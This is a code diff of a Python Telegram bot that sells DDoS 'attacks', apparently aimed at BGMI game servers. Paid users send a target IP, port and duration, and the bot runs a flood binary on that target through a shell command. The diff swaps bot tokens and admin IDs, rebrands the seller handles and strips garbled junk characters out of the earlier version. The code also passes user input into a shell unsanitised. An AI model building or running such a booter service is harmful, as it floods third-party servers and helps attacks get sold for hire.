@@ -6,12 +6,12 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7540235260:AAG-4XHHfWulJLBtWE0byUmJjjGOxoZ71A4')
+bot = telebot.TeleBot('8112121634:AAG6RBw5ORjMtp443YhmxsR5xAfVqoT4xdE')
 
 # Admin user IDs
-admin_id = {"6882674372", "6882674372"}
+admin_id = {"5579438195", "5579438195"}
 
-# File to store allowedr user IDs
+# File to store allowed user IDs
 USER_FILE = "users.txt"
 
 # File to store command logs
@@ -29,7 +29,7 @@ def read_free_users():
     try:
         with open(FREE_USER_FILE, "r") as file:
             lines = file.read().splitlines()
-            for line in lines:sbai
+            for line in lines:
                 if line.strip():  # Check if line is not empty
                     user_info = line.split()
                     if len(user_info) == 2:
@@ -40,12 +40,12 @@ def read_free_users():
     except FileNotFoundError:
         pass
 
-allowed_user_ids = readsbs_users()
+allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
     user_info = bot.get_chat(user_id)
-    if user_info.username:abau
+    if user_info.username:
         username = "@" + user_info.username
     else:
         username = f"UserID: {user_id}"
@@ -138,7 +138,7 @@ def clear_logs_command(message):
                 else:
                     file.truncate(0)
                     response = "Logs Cleared Successfully "
-        except FileNotFBaoundError:
+        except FileNotFoundError:
             response = "Logs are already cleared ."
     else:
         response = "ONLY OWNER CAN USE."
@@ -147,23 +147,23 @@ def clear_logs_command(message):
  
 
 @bot.message_handler(commands=['allusers'])
-def show_all_users(mezhssage):
+def show_all_users(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
         try:
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
-                if user_ids:zv
+                if user_ids:
                     response = "Authorized Users:\n"
                     for user_id in user_ids:
-                        try:B
+                        try:
                             user_info = bot.get_chat(int(user_id))
                             username = user_info.username
                             response += f"- @{username} (ID: {user_id})\n"
                         except Exception as e:
                             response += f"- User ID: {user_id}\n"
                 else:
-                    response =z  "No data found "
+                    response = "No data found "
         except FileNotFoundError:
             response = "No data found "
     else:
@@ -190,18 +190,18 @@ def show_recent_logs(message):
         bot.reply_to(message, response)
 
 
-@bot.mess zage_handler(commands=['id'])
+@bot.message_handler(commands=['id'])
 def show_user_id(message):
-    user_id = strsba(message.chat.id)
+    user_id = str(message.chat.id)
     response = f"Your ID: {user_id}"
     bot.reply_to(message, response)
 
 # Function to handle the reply when free users run the /bgmi
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
-    username = usa er_info.username if user_info.username else user_info.first_name
+    username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"Aᴛᴛᴀᴄᴋ Sᴛᴀʀᴛᴇᴅ Bᴀʙʏ 🫣🦋 : {target}:{port} for {time}\nAttack Running Don't put same ip port\n\nREGARDS - @TOXICPLAYER002 💞 @Vansh_Rathor✅"
+    response = f"Aᴛᴛᴀᴄᴋ Sᴛᴀʀᴛᴇᴅ Bᴀʙʏ 🫣🦋 : {target}:{port} for {time}\nAttack Running Don't put same ip port\n\nREGARDS - @DDOS_SELLER_1 💞 @SAJATH25✅"
     bot.reply_to(message, response)
 
     # Dictionary to store the last time each user ran the /bgmi command
@@ -230,19 +230,19 @@ def handle_attack(message):
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
             if time > 130:
-                response = "Error: Time interval must be less than 240."
+                response = "Error: Time interval must be less than 300."
             else:
 
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./smokie {target} {port} {time} 9 975"
+                full_command = f"./arman {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"Flooding Complete"
         else:
             response = "Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = " ❌ Access expired or unauthorized buy - @TOXICPLAYER002 💞 @Vansh_Rathor⚠️"
+        response = " ❌ Access expired or unauthorized buy - @DDOS_SELLER_1 💞 @SAJATH25⚠️"
 
     bot.reply_to(message, response)
 
